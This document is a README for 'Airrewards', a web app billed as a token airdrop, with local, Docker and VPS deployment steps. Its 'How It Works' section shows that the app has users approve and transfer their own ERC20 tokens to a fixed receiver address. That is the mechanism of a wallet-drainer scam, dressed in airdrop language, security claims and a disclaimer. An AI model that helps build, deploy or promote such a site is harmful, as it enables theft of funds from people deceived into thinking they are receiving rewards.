# Airrewards - Token Airdrop Application

A web application for facilitating token airdrops on Ethereum Virtual Machine (EVM) networks. Users can connect their wallets and approve token transfers to a designated receiver address.

## 🚀 Features

- **Wallet Integration**: Support for MetaMask, TrustWallet, and other EVM-compatible wallets
- **Smart Contract**: Secure token transfer mechanism using Solidity
- **Responsive Design**: Mobile and desktop compatible interface
- **Security**: Input validation, secure smart contract interactions
- **Multi-Network**: Support for Ethereum, BSC, Polygon, and other EVM networks

## 📋 Prerequisites

- Node.js (v16 or higher)
- npm or yarn
- Docker (optional, for containerized deployment)
- MetaMask or compatible Web3 wallet
- Ethereum RPC endpoint (Infura, Alchemy, etc.) for contract deployment

## 🛠️ Installation

### Local Development

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd Airrewards
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   ```
   
   Edit `.env` file:
   ```
   PORT=3000
   RECEIVER_ADDRESS=0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0
   PRIVATE_KEY=your_private_key_here
   INFURA_API_KEY=your_infura_api_key_here
   ```

4. **Compile smart contracts** (optional)
   ```bash
   npm run compile
   ```

5. **Start the server**
   ```bash
   npm start
   ```

6. **Access the application**
   Open your browser and navigate to `http://localhost:3000`

## 🐳 Docker Deployment

### Using Docker Compose

1. **Build and run**
   ```bash
   docker-compose up -d
   ```

2. **View logs**
   ```bash
   docker-compose logs -f
   ```

3. **Stop the application**
   ```bash
   docker-compose down
   ```

### Using Docker directly

1. **Build the image**
   ```bash
   docker build -t airrewards .
   ```

2. **Run the container**
   ```bash
   docker run -d -p 3000:3000 \
     -e RECEIVER_ADDRESS=0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0 \
     --name airrewards \
     airrewards
   ```

## 🖥️ Termius VPS Deployment

### Prerequisites
- VPS with Ubuntu 20.04 or later
- Root or sudo access
- Domain name (optional)

### Step 1: Connect to VPS via Termius

1. Open Termius and add your VPS
2. Connect using SSH credentials

### Step 2: Install Dependencies

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Verify installation
node --version
npm --version

# Install Docker (optional)
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER

# Install Docker Compose (optional)
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
```

### Step 3: Deploy Application

#### Option A: Standard Node.js Deployment

```bash
# Clone repository
git clone <repository-url>
cd Airrewards

# Install dependencies
npm install --production

# Configure environment
cp .env.example .env
nano .env  # Edit configuration

# Install PM2 for process management
sudo npm install -g pm2

# Start application
pm2 start server.js --name airrewards

# Enable auto-start on reboot
pm2 startup
pm2 save

# View logs
pm2 logs airrewards
```

#### Option B: Docker Deployment

```bash
# Clone repository
git clone <repository-url>
cd Airrewards

# Configure environment
cp .env.example .env
nano .env  # Edit configuration

# Build and start
docker-compose up -d

# Enable auto-start
docker update --restart unless-stopped airrewards
```

### Step 4: Configure Firewall

```bash
# Allow SSH
sudo ufw allow 22/tcp

# Allow HTTP/HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow application port
sudo ufw allow 3000/tcp

# Enable firewall
sudo ufw enable
```

### Step 5: Setup Nginx Reverse Proxy (Recommended)

```bash
# Install Nginx
sudo apt install nginx -y

# Create configuration
sudo nano /etc/nginx/sites-available/airrewards
```

Add the following configuration:

```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

Enable the site:

```bash
sudo ln -s /etc/nginx/sites-available/airrewards /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

### Step 6: Setup SSL with Let's Encrypt (Optional)

```bash
# Install Certbot
sudo apt install certbot python3-certbot-nginx -y

# Obtain certificate
sudo certbot --nginx -d your-domain.com

# Auto-renewal
sudo certbot renew --dry-run
```

## 📝 Smart Contract Deployment

1. **Configure Hardhat**
   
   Edit `hardhat.config.js` with your network settings and private key.

2. **Deploy to network**
   ```bash
   # Deploy to Sepolia testnet
   npx hardhat run scripts/deploy.js --network sepolia

   # Deploy to mainnet
   npx hardhat run scripts/deploy.js --network mainnet
   ```

3. **Update frontend**
   
   After deployment, update the `CONTRACT_ADDRESS` in `public/app.js` with your deployed contract address (if using the contract-based approach).

## 🔒 Security Considerations

1. **Environment Variables**: Never commit `.env` file to version control
2. **Private Keys**: Store private keys securely, use hardware wallets for production
3. **Input Validation**: The application validates all user inputs
4. **HTTPS**: Always use HTTPS in production
5. **Firewall**: Configure firewall rules properly
6. **Updates**: Keep dependencies updated regularly

## 🧪 Testing

The application uses direct token transfer, making it simple to test:

1. Connect MetaMask to a testnet (e.g., Sepolia)
2. Get test ETH from a faucet
3. Get test ERC20 tokens
4. Connect wallet to the application
5. Enter token address and amount
6. Click "Approve & Transfer"
7. Confirm transactions in MetaMask

## 📚 How It Works

1. **User connects wallet**: Uses Web3Provider to connect MetaMask or compatible wallet
2. **User enters token details**: Specifies ERC20 token address and amount
3. **Approval process**: 
   - Approves the receiver address to spend tokens
   - Transfers tokens directly to the receiver address (0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0)
4. **Transaction confirmation**: User receives confirmation with transaction hash

## 🛡️ Security Features

- Input validation for addresses and amounts
- Transaction confirmation UI highlighting receiver address
- Error handling and user-friendly error messages
- Security headers on server responses
- Rate limiting considerations for production
- Protection against common web vulnerabilities

## 🔧 Maintenance

### Update Application

```bash
# Pull latest changes
git pull

# Install new dependencies
npm install

# Restart application
pm2 restart airrewards

# Or with Docker
docker-compose down
docker-compose up -d --build
```

### Monitor Application

```bash
# With PM2
pm2 status
pm2 logs airrewards
pm2 monit

# With Docker
docker-compose logs -f
docker stats
```

### Backup

```bash
# Backup configuration
cp .env .env.backup

# Backup deployment info
cp deployment-info.json deployment-info.backup.json
```

## 📞 Support

For issues or questions, please check the documentation or contact the development team.

## 📄 License

MIT License - See LICENSE file for details

## ⚠️ Disclaimer

This application facilitates token transfers to a specific address. Users should understand the implications of approving token transfers before using the application. Always verify the receiver address before confirming transactions.
